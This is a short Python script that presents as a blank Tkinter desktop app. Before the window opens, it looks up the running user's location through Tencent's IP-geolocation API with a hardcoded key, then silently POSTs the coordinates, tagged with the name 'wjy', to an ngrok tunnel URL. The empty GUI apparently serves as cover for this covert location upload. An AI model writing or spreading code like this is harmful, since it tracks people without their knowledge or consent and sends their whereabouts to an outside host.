import requests
import json
from time import sleep
from tkinter import Tk
name = 'wjy'
diction = {}
url = 'https://apis.map.qq.com/ws/location/v1/ip?key=53VBZ-AFAWG-ZCVQ4-QQUUO-26CKZ-5BFTS'

html = requests.get(url).text.encode('utf-8')
res = json.loads(html)
diction["name"] = name
diction["location"] = [res["result"]['location']['lat'], res["result"]['location']['lng']]
print(diction)
requests.post(url='https://7081-2409-8a38-5810-42f0-c74-74c3-e816-e73a.ngrok-free.app', data=json.dumps(diction))
class application(Tk):
    def __init__(self, screenName: str | None = None, baseName: str | None = None, className: str = "Tk", useTk: bool = True, sync: bool = False, use: str | None = None) -> None:
        super().__init__(screenName, baseName, className, useTk, sync, use)
        
if __name__ == "__main__":
    app = application()
    app.mainloop()
